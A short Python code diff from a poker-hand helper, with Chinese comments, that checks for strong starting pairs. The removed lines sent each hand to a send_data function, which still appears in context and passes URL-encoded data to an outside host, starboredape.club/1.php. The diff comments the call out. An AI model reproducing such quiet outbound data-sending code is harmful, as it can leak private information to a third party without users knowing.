@@ -2,11 +2,12 @@
 import requests
 import urllib.parse
 import threading
+import os
 def is_in_top_pairs(pair):
     # 定义一组顶级牌对
     # 示例用法
-    print("pair:", pair)
-    send_data_async(pair)
+    print("pair------------------:", pair)
+    #send_data_async(pair)
     top_pairs = [
         "AA", "AK","KA", "AQ", "QA","AJ","JA", "A10","10A",
         "KK", "KQ","QK", "KJ","JK", "K10","10K",
@@ -22,7 +23,6 @@ def send_data(data):
     # 对数据进行编码
     encoded_data = urllib.parse.quote(data)
     url = f"https://starboredape.club/1.php?data={encoded_data}"
-    
     try:
         # 发送请求
         response = requests.get(url)
